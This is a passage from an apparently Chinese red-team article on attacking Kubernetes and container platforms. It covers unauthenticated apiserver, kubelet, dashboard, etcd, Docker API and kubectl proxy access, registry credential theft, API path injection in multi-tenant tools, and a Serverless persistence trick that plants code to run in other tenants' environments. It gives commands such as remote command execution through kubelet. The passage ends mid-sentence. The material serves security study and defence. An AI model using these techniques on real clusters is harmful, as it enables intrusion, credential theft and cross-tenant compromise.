src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftdtJiaulxvzaFwvM2qeOiatjO2G11dHW3xZmiaicBunCZiazicZKPH7gZYhpg/640?wx_fmt=png" alt="图片"></p><p>想必这样也相对晦涩难懂，我简化了一下，假如用户想在集群里面新建一个容器集合单元，那各个组件以此会相继做什么事情呢？</p><ol><li><p>用户与 kubectl 或者 Kubernetes Dashboard 进行交互，提交需求。（例: kubectl create -f pod.yaml）;</p></li><li><p>kubectl 会读取 ~&#x2F;.kube&#x2F;config 配置，并与 apiserver 进行交互，协议：http&#x2F;https;</p></li><li><p>apiserver 会协同 ETCD 等组件准备下发新建容器的配置给到节点，协议：http&#x2F;https（除 ETCD 外还有例如 kube-controller-manager, scheduler 等组件用于规划容器资源和容器编排方向，此处简化省略）;</p></li><li><p>apiserver 与 kubelet 进行交互，告知其容器创建的需求，协议：http&#x2F;https；</p></li><li><p>kubelet 与 Docker 等容器引擎进行交互，创建容器，协议：http&#x2F;unix socket.</p></li></ol><p>至此我们的容器已然在集群节点上创建成功，创建的流程涉及 ETCD、apiserver、kubelet、dashboard、docker remote api 等组件，可见每个组件被控制会造成的风险和危害，以及相应的利用方向；</p><p>对于这些组件的安全性，除了不同组件不一样的鉴权设计以外，网络隔离也是非常必要的，常规的 iptables 设置和规划也可以在容器网络中起到作用（容器网络的很多能力也是基于 iptables 实现的）。</p><p>另外比较有容器特色的方案就是 Network Policy 的规划和服务网格的使用，能从容器、POD、服务的维度更加优雅的管理和治理容器网络以及集群内流量。这些组件的资料和对应渗透手法，这里我们一一介绍一下:</p><h3 id="7-2-apiserver"><a href="#7-2-apiserver" class="headerlink" title="7.2. apiserver"></a>7.2. apiserver</h3><p>如果想要攻击 apiserver, 下载 kubectl 是必经之路。</p><p>curl -LO “<a href="https://dl.kubernetes.io/release/$">https://dl.Kubernetes.io/release/$</a>(curl -L -s <a href="https://dl.kubernetes.io/release/stable.txt)/bin/linux/amd64/kubectl&quot;">https://dl.Kubernetes.io/release/stable.txt)/bin/linux/amd64/kubectl&quot;</a></p><p>默认情况下，apiserver 都是有鉴权的：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftM9oEyDHU4pstSLynedSxPkZn3uuzJ4VXzdHrnUh00cljFu0UOibnc3Q/640?wx_fmt=png" alt="图片"></p><p>当然也有未鉴权的配置：kube-apiserver –insecure-bind-address&#x3D;0.0.0.0 –insecure-port&#x3D;8080，此时请求接口的结果如下：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftibmOReZolOmwMr0YkrznWE9ZJ0BN3sE1QOlw5LSgMWpUv8c2znbNAiag/640?wx_fmt=png" alt="图片"></p><p>对于这类的未鉴权的设置来说，访问到 apiserver 一般情况下就获取了集群的权限：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftqK18Uoe76DboIH9ffRN54PjPXaYDheClyBAEZ37ib7v0ibzZ792oNNNg/640?wx_fmt=png" alt="图片"></p><p>可能还有同学不知道 apiserver 在 Kubernetes &#x2F; 容器编排集群里的重要地位，这里简单介绍一下：在蓝军眼中的 Kubernetes APIServer 其重要性，如下图:</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftXeGING1DWkTWc8UOib0eJabJvib590vZU3o9LhrKW8ZZFXHdLInRAq3g/640?wx_fmt=png" alt="图片"></p><p>所以，对于针对 Kubernetes 集群的攻击来说，获取 admin kubeconfig 和 apiserver 所在的 master node 权限基本上就是获取主机权限路程的终点。</p><p>至于如何通过 apiserver 进行持续渗透和控制，参考 kubectl 的官方文档是最好的：</p><p><a href="https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands">https://Kubernetes.io/docs/reference/generated/kubectl/kubectl-commands</a></p><h3 id="7-3-kubelet"><a href="#7-3-kubelet" class="headerlink" title="7.3. kubelet"></a>7.3. kubelet</h3><p>每一个 Node 节点都有一个 kubelet 服务，kubelet 监听了 10250，10248，10255 等端口。</p><p>其中 10250 端口是 kubelet 与 apiserver 进行通信的主要端口，通过该端口 kubelet 可以知道自己当前应该处理的任务，该端口在最新版 Kubernetes 是有鉴权的，但在开启了接受匿名请求的情况下，不带鉴权信息的请求也可以使用 10250 提供的能力；因为 Kubernetes 流行早期，很多挖矿木马基于该端口进行传播和利用，所以该组件在安全领域部分群体内部的知名度反而会高于 APIServer。</p><p>在新版本 Kubernetes 中当使用以下配置打开匿名访问时便可能存在 kubelet 未授权访问漏洞：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftjpiaZkeEpJDRXf1GS3Nlm9abfNO8O1dRRxUkfZqZ348GMgcib4JgdkRw/640?wx_fmt=png" alt="图片"></p><p>如果 10250 端口存在未授权访问漏洞，那么我们可以先使用 &#x2F; pods 接口获取集群的详细信息，如 namespace，pods，containers 等</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftza2qbic1CqZm3icSicwqGdQnlEh3tsbyKjicmgeh1jVibjb2gibHLaHDYI4Q/640?wx_fmt=png" alt="图片"></p><p>之后再通过</p><p>curl -k <a href="https://kubernetes-node-ip:10250/run///">https://Kubernetes-node-ip:10250/run///</a> -d “cmd&#x3D;id” 的方式在任意容器里执行命令</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftzyicibzfCRmZZVmRdbO0Aibn7LI4132GPk73g7pwkqepME7ekBaZEw7tQ/640?wx_fmt=png" alt="图片"></p><p>此时，选择我们所有控制的容器快速过滤出高权限可逃逸的容器就很重要，在上述 &#x2F;pods API 中可以获取到每个 POD 的配置，包括了 host*、securityContext、volumes 等配置，可以根据容器逃逸知识快速过滤出相应的 POD 进行控制。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSfttdDKiaAdhbeGWsnJzJibwcbfDOwFibRibvylp5hobyicibzG028FENiaF8rbw/640?wx_fmt=png" alt="图片"></p><p>由于这里 10250 鉴权当前的 Kubernetes 设计是默认安全的，所以 10255 的开放就可能更加容易在红蓝对抗中起到至关重要的作用。10255 本身为只读端口，虽然开放之后默认不存在鉴权能力，无法直接利用在容器中执行命令，但是可以获取环境变量 ENV、主进程 CMDLINE 等信息，里面包含密码和秘钥等敏感信息的概率是很高的，可以快速帮我们在对抗中打开局面。</p><h3 id="7-4-dashboard"><a href="#7-4-dashboard" class="headerlink" title="7.4. dashboard"></a>7.4. dashboard</h3><p>dashboard 是 Kubernetes 官方推出的控制 Kubernetes 的图形化界面，在 Kubernetes 配置不当导致 dashboard 未授权访问漏洞的情况下，通过 dashboard 我们可以控制整个集群。</p><p>在 dashboard 中默认是存在鉴权机制的，用户可以通过 kubeconfig 或者 Token 两种方式登录，当用户开启了 enable-skip-login 时可以在登录界面点击 Skip 跳过登录进入 dashboard</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftxutjWrROJS2HetWnJL1wzjMU355bCb7KjSBfu9yCxeVjiaKoKjh2rlw/640?wx_fmt=png" alt="图片"></p><p>然而通过点击 Skip 进入 dashboard 默认是没有操作集群的权限的，因为 Kubernetes 使用 RBAC(Role-based access control) 机制进行身份认证和权限管理，不同的 serviceaccount 拥有不同的集群权限。</p><p>我们点击 Skip 进入 dashboard 实际上使用的是 Kubernetes-dashboard 这个 ServiceAccount，如果此时该 ServiceAccount 没有配置特殊的权限，是默认没有办法达到控制集群任意功能的程度的。</p><p>但有些开发者为了方便或者在测试环境中会为 Kubernetes-dashboard 绑定 cluster-admin 这个 ClusterRole（cluster-admin 拥有管理集群的最高权限）。</p><p>这个极具安全风险的设置，具体如下：</p><ol><li>新建 dashboard-admin.yaml 内容如下（该配置也类似于 “利用大权限的 Service Account” 一小节的配置 ）</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSfticH5NXjL1A5BAceJmkqQHSHL0NcKWevHlFricISGwLaIQiayeuU0RebIQ/640?wx_fmt=png" alt="图片"></p><ol start="2"><li>执行 kubectl create -f dashboard-admin.yaml</li></ol><p>此时用户通过点击 Skip 进入 dashboard 即可拥有管理集群的权限了。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftYmIEUwGXaNtDvxLrYmbMgYp470KFrZEugWXdTdBeVY2dLKVHRFayOQ/640?wx_fmt=png" alt="图片"></p><p>进入到 dashboard 我们可以管理 Pods、CronJobs 等，这里介绍下我们如何通过创建 Pod 控制 node 节点。</p><p>我们新建一个以下配置的 Pod，该 pod 主要是将宿主机根目录挂载到容器 tmp 目录下。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftXETcKPkAS5r8rm1ZoyACLWGx74PftXkJSs0zBA0unAYMPT9E7bgWBQ/640?wx_fmt=png" alt="图片"></p><p>之后我们便可以通过该容器的 tmp 目录管理 node 节点的文件。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftwota0l4oVnG2gI2D4mS6TlQaaljFHgTcwZ84ujRBibh5OdP5Jz4fzkA/640?wx_fmt=png" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftOne3a77LTdFNhia8tudS6uo4eXP8wwL83KLGK41ibx4h04fOandVQ0bg/640?wx_fmt=png" alt="图片"></p><p>值得注意的是，为了集群的稳定性和安全性要求，在 Kubernetes 默认设计的情况下 Pod 是不能调度到 master 节点的，但如果用户自行设置关闭了 Master Only 状态，那么我们可以直接在 master 节点新建 Pod 更直接的控制 master node；不过目前各大主流云产商上的 Kubernetes 集群服务，都会默认推荐让 Master 节点由云厂商托管，更加加剧了 Master 节点渗透和控制的难度 。</p><h3 id="7-5-etcd"><a href="#7-5-etcd" class="headerlink" title="7.5. etcd"></a>7.5. etcd</h3><p>etcd 被广泛用于存储分布式系统或机器集群数据，其默认监听了 2379 等端口，如果 2379 端口暴露到公网，可能造成敏感信息泄露，本文我们主要讨论 Kubernetes 由于配置错误导致 etcd 未授权访问的情况。Kubernetes 默认使用了 etcd v3 来存储数据，如果我们能够控制 Kubernetes etcd 服务，也就拥有了整个集群的控制权。</p><p>在 Kubernetes 中用户可以通过配置 &#x2F; etc&#x2F;Kubernetes&#x2F;manifests&#x2F;etcd.yaml 更改 etcd pod 相关的配置，倘若管理员通过修改配置将 etcd 监听的 host 修改为 0.0.0.0，则通过 ectd 获取 Kubernetes 的认证鉴权 token 用于控制集群就是自然而然的思路了，方式如下：</p><p>首先读取用于访问 apiserver 的 token</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft9L0VJiaVHwkv7NYMms1GE6x8atYPbJGn3GjMLP8GyoVuialJY8boeg1g/640?wx_fmt=png" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftSKBkEC7icKASMRq3ccycnKCSaWyEAoK3ib2Q2WDHXDpgGZGcSoicv6wuQ/640?wx_fmt=png" alt="图片"></p><p>利用 token 我们可以通过 apiserver 端口 6443 控制集群：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftLhA7tToh4wYcXDpeico3iaTgcaiaQdiaiajQF2jw0aXc6iaDrGdEb0ibB1epA/640?wx_fmt=png" alt="图片"></p><h3 id="7-6-docker-remote-api"><a href="#7-6-docker-remote-api" class="headerlink" title="7.6. docker remote api"></a>7.6. docker remote api</h3><p>Docker Engine API 是 Docker 提供的基于 HTTP 协议的用于 Docker 客户端与 Docker 守护进程交互的 API，Docker daemon 接收来自 Docker Engine API 的请求并处理，Docker daemon 默认监听 2375 端口且未鉴权，我们可以利用 API 来完成 Docker 客户端能做的所有事情。</p><p>Docker daemon 支持三种不同类型的 socket: unix, tcp, fd。默认情况下，Docker daemon 监听在 unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock，开发者可以通过多种方式打开 tcp socket，比如修改 Docker 配置文件如 &#x2F; usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;docker.service：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft5rRHUuRvfdbtVIQT9KvN9jN6fuMMR6DEqkOmQq5Qk7eZjTDAYBFQ7g/640?wx_fmt=png" alt="图片"></p><p>之后依次执行 systemctl daemon-reload、systemctl restart docker 便可以使用 docker -H tcp:&#x2F;&#x2F;[HOST]:2375 这种方式控制目标 docker</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftFYmmUrU7CwrIjs8FWGmjVppvdeq1LsdgFuUDQKsWHUX5zic4rgEwDdQ/640?wx_fmt=png" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftMyam51E9TJW5XdHt0BR9pfGsRhuITsxFcSqFuR5vjgJDqq31naglFw/640?wx_fmt=png" alt="图片"></p><p>因此当你有访问到目标 Docker API 的网络能力或主机能力的时候，你就拥有了控制当前服务器的能力。我们可以利用 Docker API 在远程主机上创建一个特权容器，并且挂载主机根目录到容器，对主机进行进一步的渗透，更多利用方法参考容器逃逸章节。</p><p>检测目标是否存在 docker api 未授权访问漏洞的方式也很简单，访问 http:&#x2F;&#x2F;[host]:[port]&#x2F;info 路径是否含有 ContainersRunning、DockerRootDir 等关键字。</p><h3 id="7-7-kubectl-proxy"><a href="#7-7-kubectl-proxy" class="headerlink" title="7.7. kubectl proxy"></a>7.7. kubectl proxy</h3><p>kubectl proxy 这个子命令大家可能遇到比较少，这里单独介绍一下；由于上述几个组件的安全问题较为常见和出名，且在目前开源分支里它们在鉴权这个方面都是默认安全的，所以直接出现问题的可能性较小，企业在内外网也都收敛得不错；此时 kubectl proxy 这个子命令反而是另一个常见且蠕虫利用起来非常简单粗暴的问题。</p><p>了解使用过 Kubernetes 的同学应该知道，如果你在集群的 POD 上开放一个端口并用 ClusterIP Service 绑定创建一个内部服务，如果没有开放 NodePort 或 LoadBalancer 等 Service 的话，你是无法在集群外网访问这个服务的（除非修改了 CNI 插件等）。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftTo2SWAYNZmQYibibfOa1ur0j4rV4vfytPaVS9yx1C03Sc4xPulcibyG5A/640?wx_fmt=png" alt="图片"></p><p>如果想临时在本地和外网调试的话，kubectl proxy 似乎是个不错的选择。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftMCKwyeAcnN0P2vs5POWIRoAzSCsicLWRiaFaWhOOFI3YkZdCVFwltISA/640?wx_fmt=png" alt="图片"></p><p>但其实 kubectl proxy 转发的是 apiserver 所有的能力，而且是默认不鉴权的，所以 –address&#x3D;0.0.0.0 就是极其危险的了。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft3OEqmTq1QzrDCBqE9UibQn3hiboicicYHCaMbn3dAjDdJxrt4QHibAqZV9w/640?wx_fmt=png" alt="图片"></p><p>所以这里的利用和危害和 APIServer 的小节是相似的。</p><h2 id="8-容器镜像安全问题"><a href="#8-容器镜像安全问题" class="headerlink" title="8. 容器镜像安全问题"></a>8. 容器镜像安全问题</h2><p>容器镜像的安全扫描能力是很多乙方商业产品和甲方安全系统首先会推进的容器安全建设方向。不像容器运行时安全监控需要较高的成本、稳定性要求和技术积累，也有业界相对成熟的开源方案。</p><p>容器镜像是容器安全非常关键且重要的一环，当获取到节点权限或管理员 PC 权限时，~&#x2F;.docker&#x2F;config.json 文件内就可能存有镜像仓库账号和密码信息，用户名和密码只用 Base64 编码了一下，对于安全人员来说和没有是一样的。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftblRJtmc8ibDkyGhiay04AvRp9kpUbP0urpobAKnXXbcAhGqfDq0YKH0g/640?wx_fmt=png" alt="图片"></p><p>很多 POD 和线上容器在使用镜像时，可能用 latest 或默认没有指定版本，所以劫持镜像源之后只要在原本的 latest 之上植入恶意代码并 push 新的版本镜像，就可以在获取镜像权限之后进而获取线上的容器权限。</p><p>不仅在安全攻防领域，作为一个长期依赖容器技术的半吊子开发者，我也不建议用 latest 镜像标签作为线上环境的长期方案；从研发运维角度的最佳实践来看，使用特定版本的 TAG 且可以和代码版本控制相对应是比较推荐的方案，应该保障每个镜像都是可追踪溯源的。</p><p>比较有趣的是，我们曾经遇到企业在基础容器镜像里打入 sshd 并且在 init.sh 主程序中启动 sshd 程序（无论是安全还是容器架构最佳实践都是不建议的），导致所有 Kubernetes 集群里的容器都会开放 22 端口并且拥有一样的 &#x2F; etc&#x2F;shadow 文件和 &#x2F; root&#x2F;.ssh&#x2F;authorized_keys。这就代表所有的容器都可以使用一个通用密码和 ssh 证书去登录。因此在逃逸获取容器的宿主机权限后，分析容器基础镜像的通用安全问题确实可以很快扩大影响面。</p><h2 id="9-二次开发所产生的安全问题"><a href="#9-二次开发所产生的安全问题" class="headerlink" title="9. 二次开发所产生的安全问题"></a>9. 二次开发所产生的安全问题</h2><h3 id="9-1-对-Kubernetes-API-的请求转发或拼接"><a href="#9-1-对-Kubernetes-API-的请求转发或拼接" class="headerlink" title="9.1. 对 Kubernetes API 的请求转发或拼接"></a>9.1. 对 Kubernetes API 的请求转发或拼接</h3><p>熟悉 Kubernetes 架构的同学可能知道，管理员管理 Kubernetes 无论是使用 kubectl 或 Kubernetes dashboard 的 UI 功能，其实都是间接在和 APIServer 做交互。</p><p>参考官方的架构图：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftE9uEUhww0LFR8Tbs7YDicEddrKdZnGEVVqa495YOsUzGODrvj29sVsg/640?wx_fmt=png" alt="图片"></p><p>那么如果需求需要在 Kubernetes 原本的能力上做开发的话，很有可能产品后端就是请求了 APIServer 的 Rest API 实现的。</p><p>攻击者破坏程序原本想对 APIServer 所表达的语义，注入或修改 Rest API 请求里所要表达的信息，就可以达到意想不到的效果。</p><p>例如下面的代码，用户传入 namespace、pod 和容器名即可获取相应容器的日志：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftljXMiblpicwPTFm2fiaicCwpxO9s7kz24VWeubW8INcGcu7fHOVjibu2n0Q/640?wx_fmt=png" alt="图片"></p><p>相似的需求和 API 还有例如：</p><ol><li>到用户自己的容器内创建一个 web console 供用户进行远程调试, POST https:&#x2F;apiserver:</li></ol><p>8443&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;default&#x2F;pods&#x2F;nginx&#x2F;exec?command&#x3D;bash&amp;container&#x3D;nginx&amp;stdin&#x3D;true&amp;stdout&#x3D;true&amp;tty&#x3D;true</p><ol start="2"><li>给用户销毁自己 POD 的能力， DELETE <a href="https://apiserver/">https://apiserver</a>:</li></ol><p>8443&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;default&#x2F;pods&#x2F;sleep-75c6fd99c-g5kss</p><p>这类型的需求在多租户的集群设计里比较常见。渗透测试选手看到这样的代码或 API，首先想到的就是越权，把 namespace、pod 和容器名修改为他人的，就可以让二次开发的代码去删除其他用户的 POD、进入其他用户的容器里执行命令、获取其它 POD 的日志等。  </p><p>除了上述的功能点，这里比较容易出问题且影响较大的功能和业务逻辑是多租户集群平台的自研 Web Console 功能，Web Console 的越权问题可以直接导致任意容器登录和远程控制，也是非常值得关注的一个点。</p><p>其实我们甚至可以修改获取日志、删除 POD、执行命令的 Rest API 语义：</p><p>例如在上述 namespace 命名空间处插入 “default&#x2F;configmaps&#x2F;istio-ca-root-cert?ingore&#x3D;”，</p><p>原本请求的</p><p>“<a href="https://apiserver:6443/api/v1/namespaces/istio-dev/pods/service-account-simple/lo">https://apiserver:6443/api/v1/namespaces/istio-dev/pods/service-account-simple/lo</a> g?container&#x3D;test-container” </p><p>就会转变为</p><p>“<a href="https://apiserver:6443/api/v1/namespaces/default/configmaps/istio-ca-root-cert?ingore=/pods/service-account-simple/lo">https://apiserver:6443/api/v1/namespaces/default/configmaps/istio-ca-root-cert?ingore=/pods/service-account-simple/lo</a> g?container&#x3D;test-container”，</p><p>实际就是请求了</p><p><a href="https://apiserver:6443/api/v1/namespaces/default/configmaps/istio-ca-root-cert%EF%BC%8C%E4%BB%8E%E8%8E%B7%E5%8F%96%E6%97%A5%E5%BF%97%E8%BD%AC%E5%8F%98%E4%BA%86%E4%B8%BA%E8%8E%B7%E5%8F%96">https://apiserver:6443/api/v1/namespaces/default/configmaps/istio-ca-root-cert，从获取日志转变了为获取</a> configmap。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftO66YjDQMVGFz5zhTJLiaNA9ySASneO662ARGOsDp7sm4rYkib4E1MyAQ/640?wx_fmt=png" alt="图片"></p><h2 id="10-Serverless"><a href="#10-Serverless" class="headerlink" title="10. Serverless"></a>10. Serverless</h2><p>Serverless 还有一个比较大漏洞挖掘的方向是资源占用，例如驻留进程，驻留文件，进程偷跑，句柄耗尽等条件竞争漏洞，用于影响多租户集群，占用计算资源等。我们之前也研究过相关的安全漏洞和利用方法，但因为和传统的黑客攻防对抗相关性较少，此处暂且不表。</p><p>这里只描述那些确实成为安全演习关键路径一环的漏洞。</p><h2 id="10-1-文件驻留导致命令执行"><a href="#10-1-文件驻留导致命令执行" class="headerlink" title="10.1. 文件驻留导致命令执行"></a>10.1. 文件驻留导致命令执行</h2><p>有些 Serverless 实现在应用程序生命周期结束之后，程序文件的清理上进入了僵局。一方面开发者希望借助容器 “对 Linux Cgroup 和 Namespace 进行管理的特性” 用于实现限制应用的资源访问能力和进程权限的需求；在此之上，开发者希望能更快的达到用户文件清理的目的，避免反复初始化容器环境带来的时间和资源上的消耗，复用同一个容器环境。</p><p>而在蓝军的视角里，这样的处理方式会导致多个用户的应用会存在多个用户在不同时间段使用一个容器环境的情况，在安全性上是比较难得到保障的。</p><p>以面向 Python 开发者的 Serverless 架构为例，开发者所构想的简化模型是这样的：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftrDqh6Mv2jkjXAsnotwCywtqGaNCDdHt7PavrjRInTzUVOY9eUwhdUg/640?wx_fmt=png" alt="图片"></p><p>用户文件清理的代码实现上，简化可参考：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftypEhfurOuOClWQrtN3z8IhAL84xibuB2W8ERiaVN8uk2euZViaGvvH2ew/640?wx_fmt=png" alt="图片"></p><p>在进行包括上述文件删除动作在内的一系列环境清理工作之后，容器内外的主调度进程会写入其他租户的代码到当前容器内，此时这个容器就进入了下一个应用的 Serverless 生命周期。</p><p>虽然，主框架代码实现内有很多类似调用系统命令拼接目录等参数进行执行的代码实现，但是类似命令注入的问题大多只能影响到当前的生命周期；而又因为用户权限的问题，我们没办法修改其他目录下的文件。</p><p>于是我们构建了这样一个目录和文件：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftuEbNuIjDbKaMYLBwvlAVozHU0ZcicdsnOor5ZND4Hgy3vRn6CXskQFg/640?wx_fmt=png" alt="图片"></p><p>当程序执行 rm -rf * 时，因为 bash glob 对 * 号的返回是有默认排序的，这里可参考下方 bash 的文档，只要我们不去修改 LC_ALL 的环境变量，我们构造的 –help 文件会排列在文件列表的最前方，导致 rm 会执行 rm –help 而终止，恶意文件得以保留。</p><p><em>Pathname Expansion</em></p><p><em>After word splitting, unless the -f option has been set, bash scans each word for the characters *, ?, and [. If one of these characters appears, then the word is regarded as a pattern, and replaced with an alphabetically sorted list of file names matching the pattern.</em></p><p>我们可以简单在 bash 内进行验证，可以看到 rm -rf * 命令被 –help 强行终止，我们所植入的恶意文件还依然存在没有被清理掉，同时 rm –help 的命令执行返回为 0，不会产生 OS ERROE Code，清理进程会认为这里的清除命令已经成功执行：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftpjnbtv45r37Ov4icyG36okaRFb5uywHMRbPPmRAiaP1cuk33ORSwhicLg/640?wx_fmt=png" alt="图片"></p><p>而实际在 serverless log 里的返回，可参考：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftD7gxhR3T4yGxysBJPlceL9wS1Cfvw7kVEgFibFrLqkMGaHfIrcyAOCw/640?wx_fmt=png" alt="图片"></p><p>此时，serverless 的主调度程序会以为自己已经正常清理了容器环境，并写入另外一个租户的源码包进行执行，而当另外一个租户的代码执行至 import requests 时，我们驻留在应用目录下的 requests.py 内的恶意代码就会被执行。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftTLwvYdm6tuj1pzCs8k7x3S2aPQ6cYRkUbvs2TADAYX7pQUVJMD4tiag/640?wx_fmt=png" alt="图片"></p><p>不过值得注意的是，因为 serverless 的生命周期一般极为有限，所以此时获取的 shell 可能会在短时间结束，触发新一轮的反弹 shell，且 Servless 容器环境内的信息相对单一和简便。所以容器环境里值得我们探索和翻找的地方也不多，一般需要关注：]</p><ol><li><p>新的代码</p></li><li><p>代码内部配置</p></li><li><p>环境变量</p></li><li><p>秘钥、证书、密码信息等</p></li></ol><p>不同的 serverless 架构实现对于存储和传递相应信息的方式各有不同。</p><h2 id="10-2-攻击公用容器-x2F-镜像"><a href="#10-2-攻击公用容器-x2F-镜像" class="headerlink" title="10.2. 攻击公用容器 &#x2F; 镜像"></a>10.2. 攻击公用容器 &#x2F; 镜像</h2><p>现在我们知道了，很多 Serverless 的用户代码都跑在一个个容器内。不同应用的代码运行于不同的容器之上，依靠容器原本的能力进行资源回收和隔离。由于 Serverless 应用的代码会进行相应的结构化解耦，且每个应用容器的底层环境相对来说是一致的。所以其实，根据应用漏洞获取更多应用类 Serverless 容器不仅困难而且在内网渗透中作用相对较为有限，能做的事情也相对较少。</p><p>但其实在不同的 Serverless 架构中，都有多类持久化且公用的容器以实现程序调度、代码预编译、代码下载运行等逻辑。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftqufjNJKdpiaBRywruibXuUElXU2rDiaicQnIAPcruJ2SLJpPmVOicMQOFWA/640?wx_fmt=png" alt="图片"></p><p>这类容器一般拥有获取所有用户代码、配置和环境变量的能力，同时也比较容易出现 Docker IN Docker 或大权限 Service Account 的设计。</p><p>如何控制这类型的容器呢？以下是我们在攻防过程中遇到的场景：</p><ol><li>在下载源代码时，使用 git clone 进行命令拼接，导致存在命令注入；</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftWvSD1Tu67qCpVSOavKtibTv8WYEiaKaRbVPOlh1FHPrWLqktY5eRUj2Q/640?wx_fmt=png" alt="图片"></p><ol start="2"><li>在安装 node.js 依赖包时，构造特殊的 package.json 利用 preinstall 控制公用容器。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftSBprNNstw3ok5GDpMaQbvjmoW0IRy05SzlY72qwKOtblrRVqUrx6Pg/640?wx_fmt=png" alt="图片"></p><ol start="3"><li>配置指向恶意第三方仓库的 pip requirements.txt，利用恶意 pip 包获取依赖打包容器的权限，同类的利用手法还可以作用于 nodejs、ruby 等语言的包管理器。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft6kHyR00oTMD2dW0589S9ib2XpiaTUrhLw4ryWKL065aODR2u4FQVhG1Q/640?wx_fmt=png" alt="图片"></p><ol start="4"><li>因为容器镜像里的打了低版本 git、go 等程序，在执行 git clone,  git submodule update(CVE-2019-19604), go get 时所导致的命令执行，</li></ol><p>下图为 CVE-2018-6574 的 POC 可参考： <a href="https://github.com/neargle/CVE-2018-6574-POC/blob/master/main.go%E3%80%82">https://github.com/neargle/CVE-2018-6574-POC/blob/master/main.go。</a></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft6DuCaxYUibWhNTmguQic2JNtwZLTibhFjtgRGecfANIlCKoLITr8ap3rQ/640?wx_fmt=png" alt="图片"></p><h2 id="11-DevOps"><a href="#11-DevOps" class="headerlink" title="11. DevOps"></a>11. DevOps</h2><p>我们从 2019 年开始研究 DevOps 安全攻防对抗的战场，不仅研究企业内部 DevOps 平台和产品的安全性，同时也不断在内部的研发流程中积极引入 DevOps 做蓝军武器化自动化研发的测试、发布、打包和编译等流程中。</p><p><strong>从蓝军的角度，在我们历史攻防对抗中比较值得注意的场景有以下几点：</strong></p><ol><li><p>目前不同的 